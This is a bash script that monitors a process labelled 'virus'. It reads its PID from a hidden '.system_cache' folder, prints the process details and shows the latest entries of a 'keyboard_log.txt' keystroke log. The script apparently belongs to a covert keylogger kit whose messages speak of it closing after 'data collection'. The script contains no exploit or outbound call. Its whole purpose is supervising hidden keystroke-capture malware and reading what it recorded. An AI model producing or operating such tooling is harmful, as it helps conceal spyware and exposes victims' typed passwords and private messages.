#!/bin/bash
# Script to check if virus is still running

echo "=== Virus Status Check ==="
echo ""

# Check PID file
PID_FILE=".system_cache/virus.pid"

if [ ! -f "$PID_FILE" ]; then
    echo "❌ Virus PID file not found - virus is NOT running"
    exit 1
fi

PID=$(cat "$PID_FILE" 2>/dev/null)

if [ -z "$PID" ]; then
    echo "❌ Virus PID file is empty - virus is NOT running"
    exit 1
fi

echo "📄 PID file found: $PID_FILE"
echo "🔢 Process ID: $PID"
echo ""

# Check if process is actually running
if ps -p "$PID" > /dev/null 2>&1; then
    echo "✅ Virus is RUNNING"
    echo ""
    echo "Process details:"
    ps -p "$PID" -o pid,ppid,cmd,etime,pcpu,pmem
    echo ""
    echo "Recent activity logs (last 5 lines from keyboard_log.txt):"
    if [ -f ".system_cache/keyboard_log.txt" ]; then
        tail -5 .system_cache/keyboard_log.txt
    else
        echo "  No log found yet"
    fi
else
    echo "❌ Virus is NOT running (process $PID not found)"
    echo ""
    echo "The PID file exists but the process is dead."
    echo "This might mean:"
    echo "  - Virus crashed"
    echo "  - Virus was killed"
    echo "  - Virus auto-closed after data collection"
    echo ""
    echo "Removing stale PID file..."
    rm -f "$PID_FILE"
    exit 1
fi

